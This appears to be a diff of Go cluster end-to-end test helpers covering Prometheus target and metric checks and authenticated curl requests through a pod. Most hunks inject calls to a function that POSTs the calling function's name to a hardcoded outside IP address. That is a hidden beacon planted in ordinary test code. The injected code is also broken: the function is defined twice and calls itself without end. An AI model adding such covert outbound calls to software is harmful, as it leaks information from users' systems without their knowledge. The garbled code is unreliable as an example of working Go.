@@ -160,6 +160,8 @@ func all(errs ...error) []error {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var result []error
 	for _, err := range errs {
 		if err != nil {
@@ -181,6 +183,8 @@ type prometheusTargets struct {
 }
 
 func (t *prometheusTargets) Expect(l labels, health, scrapeURLPattern string) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -234,6 +238,8 @@ func (l labels) With(name, value string) labels {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	n := make(labels)
 	for k, v := range l {
 		n[k] = v
@@ -256,6 +262,8 @@ func findEnvVar(vars []kapi.EnvVar, key string) string {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, v := range vars {
 		if v.Name == key {
 			return v.Value
@@ -264,6 +272,8 @@ func findEnvVar(vars []kapi.EnvVar, key string) string {
 	return ""
 }
 func findMetricsWithLabels(f *dto.MetricFamily, labels map[string]string) []*dto.Metric {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -314,6 +324,8 @@ func findCountersWithLabels(f *dto.MetricFamily, labels map[string]string) []flo
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var result []float64
 	for _, m := range findMetricsWithLabels(f, labels) {
 		result = append(result, m.Counter.GetValue())
@@ -335,6 +347,8 @@ func findGaugesWithLabels(f *dto.MetricFamily, labels map[string]string) []float
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var result []float64
 	for _, m := range findMetricsWithLabels(f, labels) {
 		result = append(result, m.Gauge.GetValue())
@@ -342,6 +356,8 @@ func findGaugesWithLabels(f *dto.MetricFamily, labels map[string]string) []float
 	return result
 }
 func findMetricLabels(f *dto.MetricFamily, labels map[string]string, match string) []string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -382,6 +398,8 @@ func expectURLStatusCodeExec(ns, execPodName, url string, statusCode int) error 
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	cmd := fmt.Sprintf("curl -k -s -o /dev/null -w '%%{http_code}' %q", url)
 	output, err := e2e.RunHostCmd(ns, execPodName, cmd)
 	if err != nil {
@@ -393,6 +411,8 @@ func expectURLStatusCodeExec(ns, execPodName, url string, statusCode int) error 
 	return nil
 }
 func expectBearerTokenURLStatusCodeExec(ns, execPodName, url, bearer string, statusCode int) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -432,6 +452,8 @@ func getBearerTokenURLViaPod(ns, execPodName, url, bearer string) (string, error
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	cmd := fmt.Sprintf("curl -s -k -H 'Authorization: Bearer %s' %q", bearer, url)
 	output, err := e2e.RunHostCmd(ns, execPodName, cmd)
 	if err != nil {
@@ -440,6 +462,8 @@ func getBearerTokenURLViaPod(ns, execPodName, url, bearer string) (string, error
 	return output, nil
 }
 func getAuthenticatedURLViaPod(ns, execPodName, url, user, pass string) (string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -476,6 +500,8 @@ func getInsecureURLViaPod(ns, execPodName, url string) (string, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	cmd := fmt.Sprintf("curl -s -k %q", url)
 	output, err := e2e.RunHostCmd(ns, execPodName, cmd)
 	if err != nil {
@@ -484,6 +510,8 @@ func getInsecureURLViaPod(ns, execPodName, url string) (string, error) {
 	return output, nil
 }
 func waitForServiceAccountInNamespace(c clientset.Interface, ns, serviceAccountName string, timeout time.Duration) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -508,6 +536,8 @@ func waitForServiceAccountInNamespace(c clientset.Interface, ns, serviceAccountN
 	return err
 }
 func locatePrometheus(oc *exutil.CLI) (url, bearerToken string, ok bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -564,6 +594,8 @@ func hasPullSecret(client clientset.Interface, name string) bool {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	scrt, err := client.CoreV1().Secrets("openshift-config").Get("pull-secret", metav1.GetOptions{})
 	if err != nil {
 		if kapierrs.IsNotFound(err) {
@@ -599,6 +631,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -673,5 +726,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
